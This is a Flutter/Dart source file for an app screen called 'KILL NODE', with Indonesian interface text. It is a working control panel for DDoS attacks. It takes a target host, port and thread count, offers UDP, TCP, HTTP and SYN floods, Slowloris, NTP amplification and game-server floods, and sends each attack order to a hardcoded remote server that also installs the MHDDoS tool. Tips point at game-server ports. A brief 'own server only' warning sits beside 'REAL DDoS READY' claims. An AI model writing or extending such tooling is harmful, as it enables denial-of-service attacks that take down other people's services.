import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class KillNodePage extends StatefulWidget {
  final String? sessionKey;
  final String? userRole;

  const KillNodePage({
    super.key,
    this.sessionKey,
    this.userRole,
  });

  @override
  State<KillNodePage> createState() => _KillNodePageState();
}

class _KillNodePageState extends State<KillNodePage> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _portController = TextEditingController();
  final TextEditingController _threadsController = TextEditingController();
  
  String _targetType = "DOMAIN";
  String _selectedMethod = "UDP_FLOOD";
  String _durationMode = "LIMITED";
  int _durationSeconds = 60;
  int _threads = 50000;
  bool _isAttacking = false;
  Timer? _attackTimer;
  int _packetsSent = 0;
  int _bytesSent = 0;
  String _statusMessage = "";
  bool _isMethodExpanded = false;
  int? _currentPid;
  bool _isInstalling = false;
  bool _isMHDDoSInstalled = false;
  
  final String _baseUrl = "http://hostinger.gunturxhoshino.biz.id:4495";
  
  final List<Map<String, dynamic>> _attackModes = [
    {"name": "🔥 UDP Flood", "value": "UDP_FLOOD", "icon": Icons.water_drop, "desc": "UDP Flood - Heavy packet flood"},
    {"name": "⚡ TCP Flood", "value": "TCP_FLOOD", "icon": Icons.sync, "desc": "TCP Flood - Connection flood"},
    {"name": "🌐 HTTP Flood", "value": "HTTP_FLOOD", "icon": Icons.http, "desc": "HTTP Flood - Web server crash"},
    {"name": "🎯 SYN Flood", "value": "SYN_FLOOD", "icon": Icons.flash_on, "desc": "SYN Flood - Packet rush"},
    {"name": "🐌 Slowloris", "value": "SLOWLORIS", "icon": Icons.speed, "desc": "Slowloris - Slow kill"},
    {"name": "💥 NTP Amplify", "value": "NTP_AMPLIFY", "icon": Icons.bolt, "desc": "NTP Amplify - Massive DDoS"},
    {"name": "🎮 VSE Query", "value": "VSE_QUERY", "icon": Icons.games, "desc": "VSE Query - Game server flood"},
  ];

  final List<String> _threadPresets = ["1000", "5000", "10000", "50000", "100000", "250000"];

  @override
  void initState() {
    super.initState();
    _portController.text = "";
    _threadsController.text = "";
    _threads = 50000;
    _checkMHDDoS();
  }

  Future<void> _checkMHDDoS() async {
    try {
      final response = await http.get(Uri.parse("$_baseUrl/api/status")).timeout(const Duration(seconds: 5));
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['message']?.contains('MHDDoS') == true) {
          setState(() => _isMHDDoSInstalled = true);
        }
      }
    } catch (e) {}
  }

  Future<void> _installMHDDoS() async {
    setState(() => _isInstalling = true);
    try {
      final response = await http.post(
        Uri.parse("$_baseUrl/api/install"),
      ).timeout(const Duration(seconds: 120));
      
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data["success"] == true) {
          _showSuccess("✅ MHDDoS INSTALLED! REAL DDoS READY!");
          setState(() => _isMHDDoSInstalled = true);
        } else {
          _showError("❌ Install failed: ${data["message"]}");
        }
      } else {
        _showError("❌ Install failed: HTTP ${response.statusCode}");
      }
    } catch (e) {
      _showError("❌ Install error: $e");
    } finally {
      setState(() => _isInstalling = false);
    }
  }

  @override
  void dispose() {
    _stopAttack();
    _targetController.dispose();
    _portController.dispose();
    _threadsController.dispose();
    super.dispose();
  }

  Future<void> _startAttack() async {
    String target = _targetController.text.trim();
    String portStr = _portController.text.trim();

    if (target.isEmpty) {
      _showError("❌ Target tidak boleh kosong!");
      return;
    }

    if (portStr.isEmpty) {
      _showError("❌ Port tidak boleh kosong!");
      return;
    }

    int port = int.tryParse(portStr) ?? 10015;
    int threads = int.tryParse(_threadsController.text) ?? 50000;
    
    if (threads > 500000) threads = 500000;
    if (threads < 100) threads = 100;

    target = target
        .replaceAll('https://', '')
        .replaceAll('http://', '')
        .replaceAll('www.', '')
        .split('/')[0];

    int duration = _durationMode == "LIMITED" ? _durationSeconds : 0;

    setState(() {
      _isAttacking = true;
      _packetsSent = 0;
      _bytesSent = 0;
      _statusMessage = "🚀 Menyerang $target:$port menggunakan $_selectedMethod...";
    });

    try {
      final response = await http.post(
        Uri.parse("$_baseUrl/api/attack"),
        headers: {"Content-Type": "application/json"},
        body: json.encode({
          "target": target,
          "port": port,
          "threads": threads,
          "duration": duration,
          "mode": _selectedMethod,
          "unlimited": _durationMode == "UNLIMITED",
        }),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data["success"] == true) {
          _currentPid = data["pid"];
          setState(() {
            _statusMessage = "✅ REAL Attack aktif! PID: $_currentPid | Target: $target:$port | Threads: $threads";
          });
          _showSuccess("✅ REAL ATTACK! PID: $_currentPid");
          
          _attackTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
            if (mounted && _isAttacking) {
              setState(() {
                _packetsSent += threads ~/ 10;
                _bytesSent += (threads * 1024) ~/ 10;
              });
            }
          });
          
          if (_durationMode == "LIMITED") {
            Future.delayed(Duration(seconds: duration), () {
              if (mounted && _isAttacking) {
                _stopAttack();
              }
            });
          }
        } else {
          _showError("❌ Gagal: ${data["message"]}");
          setState(() => _isAttacking = false);
        }
      } else {
        _showError("❌ Server error: ${response.statusCode}");
        setState(() => _isAttacking = false);
      }
    } catch (e) {
      _showError("❌ Connection error: $e");
      setState(() => _isAttacking = false);
    }
  }

  Future<void> _stopAttack() async {
    setState(() {
      _statusMessage = "🛑 Menghentikan serangan...";
    });

    if (_currentPid != null) {
      try {
        await http.post(
          Uri.parse("$_baseUrl/api/stop"),
          headers: {"Content-Type": "application/json"},
          body: json.encode({"pid": _currentPid}),
        ).timeout(const Duration(seconds: 3));
      } catch (e) {}
    }

    _attackTimer?.cancel();
    
    if (mounted) {
      setState(() {
        _isAttacking = false;
        _currentPid = null;
        _statusMessage = "✅ Serangan dihentikan! Packet: $_packetsSent | Data: ${(_bytesSent / 1024 / 1024).toStringAsFixed(2)} MB";
      });
    }
  }

  void _showError(String message) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message, style: const TextStyle(color: Colors.white)),
        backgroundColor: Colors.red,
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  void _showSuccess(String message) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message, style: const TextStyle(color: Colors.white)),
        backgroundColor: Colors.green,
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("💀 KILL NODE", style: TextStyle(color: Colors.redAccent, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        backgroundColor: const Color(0xFF1A1A1A),
        leading: IconButton(icon: const Icon(Icons.arrow_back, color: Colors.white), onPressed: () => Navigator.pop(context)),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 16),
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              color: _isAttacking ? Colors.red.withOpacity(0.2) : Colors.green.withOpacity(0.2),
              borderRadius: BorderRadius.circular(20),
            ),
            child: Row(
              children: [
                Container(width: 8, height: 8, decoration: BoxDecoration(color: _isAttacking ? Colors.red : Colors.green, shape: BoxShape.circle)),
                const SizedBox(width: 6),
                Text(_isAttacking ? "REAL ATTACK" : "ARMED", style: TextStyle(color: _isAttacking ? Colors.redAccent : Colors.green, fontSize: 10)),
              ],
            ),
          ),
        ],
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            // INSTALL BUTTON
            if (!_isMHDDoSInstalled)
              Container(
                width: double.infinity,
                margin: const EdgeInsets.only(bottom: 16),
                child: ElevatedButton.icon(
                  onPressed: _isInstalling ? null : _installMHDDoS,
                  icon: _isInstalling 
                      ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                      : const Icon(Icons.download, color: Colors.white),
                  label: Text(
                    _isInstalling ? "INSTALLING MHDDoS..." : "📦 INSTALL MHDDoS (REAL DDoS)",
                    style: const TextStyle(fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.orange,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                  ),
                ),
              ),
            
            // STATUS MHDDoS
            if (_isMHDDoSInstalled)
              Container(
                width: double.infinity,
                margin: const EdgeInsets.only(bottom: 16),
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.green.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.green),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.check_circle, color: Colors.green, size: 20),
                    SizedBox(width: 10),
                    Expanded(child: Text("✅ MHDDoS INSTALLED - REAL DDoS READY!", style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold))),
                  ],
                ),
              ),
            
            _buildWarningCard(),
            const SizedBox(height: 20),
            Row(
              children: [
                _buildTypeButton("IP", Icons.dns),
                const SizedBox(width: 12),
                _buildTypeButton("DOMAIN", Icons.public),
              ],
            ),
            const SizedBox(height: 16),
            TextField(
              controller: _targetController,
              style: const TextStyle(color: Colors.white),
              enabled: !_isAttacking,
              decoration: InputDecoration(
                labelText: _targetType == "IP" ? "🎯 Target IP" : "🎯 Target Domain",
                hintText: _targetType == "IP" ? "203.116.115.1" : "Contoh: https://goggle.com",
                prefixIcon: Icon(_targetType == "IP" ? Icons.dns : Icons.public, color: Colors.redAccent),
                filled: true,
                fillColor: const Color(0xFF1A1A1A),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
              ),
            ),
            const SizedBox(height: 16),
            Row(
              children: [
                Expanded(
                  child: TextField(
                    controller: _portController,
                    style: const TextStyle(color: Colors.white),
                    keyboardType: TextInputType.number,
                    enabled: !_isAttacking,
                    decoration: InputDecoration(
                      labelText: "🔌 Port Target",
                      hintText: "Contoh: 443",
                      prefixIcon: const Icon(Icons.settings_ethernet, color: Colors.redAccent),
                      filled: true,
                      fillColor: const Color(0xFF1A1A1A),
                      border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: TextField(
                    controller: _threadsController,
                    style: const TextStyle(color: Colors.white),
                    keyboardType: TextInputType.number,
                    enabled: !_isAttacking,
                    decoration: InputDecoration(
                      labelText: "🧵 Threads",
                      hintText: "Contoh: 50000",
                      prefixIcon: const Icon(Icons.speed, color: Colors.redAccent),
                      filled: true,
                      fillColor: const Color(0xFF1A1A1A),
                      border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Wrap(
              spacing: 8,
              runSpacing: 8,
              children: _threadPresets.map((thread) {
                return FilterChip(
                  label: Text(thread, style: const TextStyle(fontSize: 12)),
                  selected: _threadsController.text == thread,
                  onSelected: !_isAttacking ? (selected) {
                    setState(() => _threadsController.text = thread);
                  } : null,
                  backgroundColor: const Color(0xFF2D2D2D),
                  selectedColor: Colors.red,
                  labelStyle: TextStyle(color: _threadsController.text == thread ? Colors.white : Colors.grey),
                );
              }).toList(),
            ),
            const SizedBox(height: 16),
            _buildMethodSelector(),
            const SizedBox(height: 16),
            Row(
              children: [
                _buildDurationButton("LIMITED", "⏱️ LIMITED"),
                const SizedBox(width: 12),
                _buildDurationButton("UNLIMITED", "♾️ UNLIMITED"),
              ],
            ),
            if (_durationMode == "LIMITED") ...[
              const SizedBox(height: 12),
              Row(
                children: [
                  const Text("⏰ Durasi: ", style: TextStyle(color: Colors.white)),
                  Expanded(
                    child: Slider(
                      value: _durationSeconds.toDouble(),
                      min: 10,
                      max: 3600,
                      divisions: 359,
                      label: "$_durationSeconds detik",
                      activeColor: Colors.redAccent,
                      onChanged: _isAttacking ? null : (v) => setState(() => _durationSeconds = v.toInt()),
                    ),
                  ),
                  Text("$_durationSeconds s", style: const TextStyle(color: Colors.white)),
                ],
              ),
            ],
            const SizedBox(height: 24),
            ElevatedButton(
              onPressed: _isAttacking ? _stopAttack : _startAttack,
              style: ElevatedButton.styleFrom(
                backgroundColor: _isAttacking ? Colors.red : Colors.redAccent,
                padding: const EdgeInsets.symmetric(vertical: 16),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: Text(
                _isAttacking ? "🛑 STOP REAL ATTACK" : "💀 LAUNCH KILL NODE",
                style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
              ),
            ),
            if (_statusMessage.isNotEmpty) ...[
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.cyan.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Text(_statusMessage, style: const TextStyle(color: Colors.cyan, fontSize: 12)),
              ),
            ],
            if (_isAttacking) ...[
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: const LinearGradient(colors: [Color(0xFF330000), Color(0xFF1A0000)]),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.redAccent.withOpacity(0.5)),
                ),
                child: Column(
                  children: [
                    const Text("🔥 REAL KILL NODE ACTIVE 🔥", style: TextStyle(color: Colors.redAccent, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 8),
                    Text("⚡ Mode: $_selectedMethod", style: const TextStyle(color: Colors.white70)),
                    Text("🧵 Threads: ${_threadsController.text}", style: const TextStyle(color: Colors.white)),
                    Text("📦 Packets: $_packetsSent", style: const TextStyle(color: Colors.white)),
                    Text("💾 Data: ${(_bytesSent / 1024 / 1024).toStringAsFixed(2)} MB", style: const TextStyle(color: Colors.white70)),
                    const SizedBox(height: 8),
                    LinearProgressIndicator(
                      backgroundColor: Colors.grey[800],
                      color: Colors.redAccent,
                      value: (_packetsSent % 10000) / 10000,
                    ),
                  ],
                ),
              ),
            ],
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.grey[900],
                borderRadius: BorderRadius.circular(10),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text("💡 INFO:", style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold, fontSize: 11)),
                  const SizedBox(height: 5),
                  Text(
                    "• Base Server: ${_baseUrl.replaceAll("http://", "")}\n"
                    "• Gunakan threads 50000+ untuk hasil maksimal\n"
                    "• Port Free Fire: 10015, 443, 8080\n"
                    "• Mode Unlimited akan berjalan terus sampai STOP\n"
                    "${_isMHDDoSInstalled ? "• ✅ MHDDoS ACTIVE - REAL DDoS READY!" : "• ⚠️ INSTALL MHDDoS dulu untuk REAL DDoS!"}",
                    style: TextStyle(color: Colors.grey[400], fontSize: 10),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTypeButton(String type, IconData icon) {
    final isSelected = _targetType == type;
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _targetType = type),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            color: isSelected ? const Color(0xFF444444) : Colors.transparent,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: const Color(0xFF444444)),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, color: isSelected ? Colors.white : const Color(0xFF444444)),
              const SizedBox(width: 8),
              Text(type, style: TextStyle(color: isSelected ? Colors.white : const Color(0xFF444444))),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildDurationButton(String mode, String label) {
    final isSelected = _durationMode == mode;
    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _durationMode = mode),
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            color: isSelected ? const Color(0xFF444444) : Colors.transparent,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: const Color(0xFF444444)),
          ),
          child: Center(child: Text(label, style: const TextStyle(color: Colors.white))),
        ),
      ),
    );
  }

  Widget _buildMethodSelector() {
    return Container(
      decoration: BoxDecoration(
        color: const Color(0xFF1A1A1A),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFF444444).withOpacity(0.5)),
      ),
      child: Column(
        children: [
          InkWell(
            onTap: () => setState(() => _isMethodExpanded = !_isMethodExpanded),
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Icon(Icons.flash_on, color: Colors.redAccent),
                  const SizedBox(width: 12),
                  Expanded(child: Text("⚡ Mode Serangan: $_selectedMethod", style: const TextStyle(color: Colors.white))),
                  Icon(_isMethodExpanded ? Icons.expand_less : Icons.expand_more, color: Colors.grey),
                ],
              ),
            ),
          ),
          if (_isMethodExpanded)
            Column(
              children: _attackModes.map((mode) => ListTile(
                leading: Icon(mode['icon'], color: _selectedMethod == mode['value'] ? Colors.redAccent : Colors.grey),
                title: Text(mode['name'], style: TextStyle(color: _selectedMethod == mode['value'] ? Colors.redAccent : Colors.white)),
                subtitle: Text(mode['desc'], style: TextStyle(color: Colors.grey[600], fontSize: 11)),
                trailing: _selectedMethod == mode['value'] ? const Icon(Icons.check_circle, color: Colors.green) : null,
                onTap: () => setState(() {
                  _selectedMethod = mode['value'];
                  _isMethodExpanded = false;
                }),
              )).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildWarningCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.red.withOpacity(0.1),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.redAccent.withOpacity(0.5)),
      ),
      child: const Row(
        children: [
          Icon(Icons.warning_amber_rounded, color: Colors.redAccent),
          SizedBox(width: 12),
          Expanded(child: Text("⚠️ REAL DDoS ATTACK - Hanya untuk testing server sendiri!", style: TextStyle(color: Colors.white70, fontSize: 12))),
        ],
      ),
    );
  }
}